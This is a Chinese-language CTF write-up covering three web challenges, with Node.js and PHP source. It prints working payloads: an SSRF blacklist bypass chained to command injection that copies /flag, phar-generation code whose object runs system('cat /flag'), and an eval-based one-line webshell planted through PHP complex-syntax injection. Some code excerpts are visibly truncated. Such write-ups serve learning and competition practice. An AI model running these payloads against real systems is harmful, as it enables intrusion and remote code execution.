    var fs=require('fs');
    var request=require('request');
    var router = express.Router();
    var blacklist=['127.0.0.1.xip.io','::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];
    router.get('/', function(req, res, next) {
        res.json({});
    });
    router.get('/debug', function(req, res, next) {
        console.log(req.ip);
        if(blacklist.indexOf(req.ip)!=-1){
            console.log('res');
        var u=req.query.url.replace(/[\"\']/ig,'');
        console.log(url.parse(u).href);
        let log=`echo  '${url.parse(u).href}'>>/tmp/log`;
        console.log(log);
        child_process.exec(log);
        res.json({data:fs.readFileSync('/tmp/log').toString()});
        }else{
            res.json({});
        }
    });
    router.post('/debug', function(req, res, next) {
        console.log(req.body);
        if(req.body.url !== undefined) {
            var u = req.body.url;
        var urlObject=url.parse(u);
        if(blacklist.indexOf(urlObject.hostname) == -1){
            var dest=urlObject.href;
            request(dest,(err,result,body)=>{
                res.json(body);
            })
        }
        else{
            res.json([]);
        }
        }
    });
    module.exports = router;
首先在`GET`方式的`debug`路由中，存在可控的命令执行，但是需要`req.ip`为黑名单的`ip`，那么就可以确定这是一道`SSRF`题目了，然后看`POST`方式`debug`路由，可知这道题目的解题方法应该是通过`POST`访问`debug`路由，传递`url`参数，使`url`参数经过`url.parse()`处理后对应的`hostname`不在黑名单中，然后调用`request()`去访问`url.parse`处理后的`href`，这里由于黑名单过滤不全，可以通过`http://2130706433/`、`http://0177.0.0.01/`等方式绕过；之后就是要闭合单引号，执行多条命令了，经过测试发现，在`@`符号之前输入`%27`，会经过url解码变成单引号，如下
    var url=require('url');
    var request=require('request');
    var u = "http://aaa%27@:8000%27qq.com";
    urlObject=url.parse(u);
    console.log(urlObject);
    /*
    Url {
      protocol: 'http:',
      slashes: true,
      auth: 'aaa\'',
      host: ':8000',
      port: '8000',
      hostname: '',
      hash: null,
      search: null,
      query: null,
      pathname: '%27qq.com',
      path: '%27qq.com',
      href: 'http://aaa\'@:8000/%27qq.com' }
      */
之后就是执行命令了，但是没有回显，可以尝试将`flag`写入文件中，经过测试发现`>`、`}`和空格符等字符都会被编码，就不能利用`cat`和`>`来写入文件了，所以最后利用`cp`将`flag`复制到`/tmp/log/`中，然后直接就可以直接读FLAG了。  
payload: `http://2130706433/debug?url=http://%2527[@1](https://github.com/1
"@1");cp$IFS$9/flag$IFS$9/tmp/log;%23`
## Day2
###  0x01 game_exp
审计源码发现有下面两个反序列化利用点，
通过`info.php`，可以看到服务器段开启了soap扩展，可以进行SSRF，执行命令。然后寻找可以触发反序列化的点，在`login/register.php`中存在一个`file_exists()`函数，这个函数可以触发`phar`文件的反序列化，审计`register.php`
上传的图片限制死了类型只能为图片，但是文件名和路径是可控的，可以先上传phar文件，然后再注册一遍用户，对应的用户名为`phar://`加上之前注册的用户名，然后在`file_exists()`函数触发反序列化，首先生成`phar`文件，
     output = 'system("cat /flag");';;
        }
    }
    $object = new AnyClass();
    $phar = new Phar('a.phar');
    $phar -> startBuffering();
    $phar -> setStub('GIF89a'.'');   //设置stub，增加gif文件头
    $phar ->addFromString('test.txt','test');  //添加要压缩的文件
    $phar -> setMetadata($object);  //将自定义meta-data存入manifest
    $phar -> stopBuffering();
    ?>
修改后缀名后上传
然后继续注册一个`phar://asdf`的用户去触发反序列化
###  0x02 novel
打开靶机是下面这样的界面
可以上传和备份文件，然后审计源码，
    //index.php
    filename=$config['filename'];
            $this->method=$config['method'];
            $this->dest=$config['dest'];
            if(in_array($this->method, array('backup'))){
                $this->{$this->method}($this->filename, $this->dest);
            }else{
                    header('Location: /');
            }
        }
        public function backup($filename, $dest){
            $filename='profile/'.$filename;
            if(file_exists($filename)){
                $content=htmlspecialchars(file_get_contents($filename),ENT_QUOTES);
                $password=$this->random_code();
                $r['path']=$this->_write($dest, $this->_create($password, $content));
                $r['password']=$password;
                echo json_encode($r);
            }
        }
        /* 先验证保证为备份文件后,再保存为私藏文件 */
        private function _write($dest, $content){
            $f1=$dest;
            $f2='private/'.$this->random_code(10).".php";
            $stream_f1 = fopen($f1, 'w+');
            fwrite($stream_f1, $content);
            rewind($stream_f1);
            $f1_read=fread($stream_f1, 3000);
            preg_match('/^');
                fclose($stream_f1);
                return false;
            }
        }
        private function _create($password, $content){
            $_content='`。
理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过back生成php文件，开始尝试使用`"?>`闭合前面，但是不能成功，`htmlspecialchars()`会将双引号和尖括号编码，之后采用复杂语法，`{${phpinfo()}}`进行rce。首先上传一个内容为`{${eval($_GET[1])}}`的txt,
之后调用`back`的`backup()`函数将一句话写进php文件，
然后访问
经过这次比赛后，感觉一些知识点的积累还是远远不够的，很多`web`题目都没有修复成功（太菜了），还有一道`java`题肝不动，上面的每道题应该都不止我分享的这种做法，欢迎师傅们评论分享其他骚的思路、修复的骚操作或者是那道`java`题的做法。另外有需要源码的同学可以联系我哈。